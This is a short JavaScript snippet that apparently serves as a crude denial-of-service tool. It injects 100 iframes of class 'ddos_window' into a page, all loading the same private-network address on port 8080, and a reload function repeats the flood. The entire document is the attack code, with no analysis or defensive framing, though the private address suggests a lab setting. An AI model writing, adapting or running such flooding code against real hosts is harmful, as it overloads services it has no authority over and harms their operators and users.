function generateWindows(){
    let container=document.querySelector(".container");
    let parentNode=container.parentNode;
    parentNode.removeChild(container);
    container.innerHTML="";
    for(let i=0; i<100;i++){
        container.innerHTML+=/*html*/`<iframe class="ddos_window" src="http://192.168.59.144:8080"></iframe>`;
    }
    parentNode.appendChild(container);
}
function reload(){
    generateWindows();
}